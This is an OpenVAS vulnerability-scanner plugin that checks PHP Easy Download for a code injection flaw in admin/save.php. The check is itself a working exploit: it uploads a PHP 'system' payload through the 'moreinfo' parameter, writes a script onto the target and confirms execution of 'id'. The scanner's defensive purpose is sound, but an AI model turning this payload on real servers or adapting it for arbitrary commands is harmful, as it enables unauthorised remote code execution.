# OpenVAS Vulnerability Test
# $Id: phpeasydownload_code_injection.nasl 5779 2017-03-30 06:57:12Z cfi $
# Description: PHP Easy Download admin/save.php Paramater Code Injection Vulnerability
#
# Authors:
# Justin Seitz <jms@bughunter.ca>
#
# Copyright:
# Copyright (C) 2006 Justin Seitz
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server contains a PHP script that is affected by a
remote code execution issue. 

Description:

The version of PHP Easy Download installed on the remote host fails to
sanitize input to the 'moreinfo' parameter before using it in the
'save.php' script.  By sending a specially-crafted value, an attacker
can store and execute code at the privilege level of the remote web
server.";

tag_solution = "Unknown at this time.";

if(description)
{
  script_id(80076);
  script_version("$Revision: 5779 $");
  script_tag(name:"last_modification", value:"$Date: 2017-03-30 08:57:12 +0200 (Thu, 30 Mar 2017) $");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_bugtraq_id(21179);
  script_name("PHP Easy Download admin/save.php Paramater Code Injection Vulnerability");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2006 Justin Seitz");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/2812");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port)) exit(0);

filename = string(SCRIPT_NAME,"-",unixtime(),".php");
cmd = "id";
code = urlencode(str:string('<?php system(', cmd, "); ?>"));

foreach dir( make_list_unique( "/easydownload", "/phpeasydownload", "/download", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = string(dir,"/file_info/admin/save.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) continue;

  if ("# of Accesses:" >< res) {
    data = string("description=0&moreinfo=",code,"&accesses=0&filename=",filename,"&date=&B1=Submit");
    attackreq = http_post(port:port, item:url, data:data);
    attackreq = ereg_replace(string:attackreq, pattern:"Content-Length: ", replace: string("Content-Type: application/x-www-form-urlencoded\r\nContent-Length: "));
    attackres = http_keepalive_send_recv(port:port,data:attackreq,bodyonly:TRUE);
    if (attackres == NULL) continue;

    #Check the file we just uploaded for our random string we generated.
    http_check_remote_code(
      unique_dir:dir,
      check_request:string("/file_info/descriptions/",filename,".0"),
      check_result:"uid=[0-9]+.*gid=[0-9]+.*",
      command:"id",
      port:port
    );
  }
}

exit( 0 );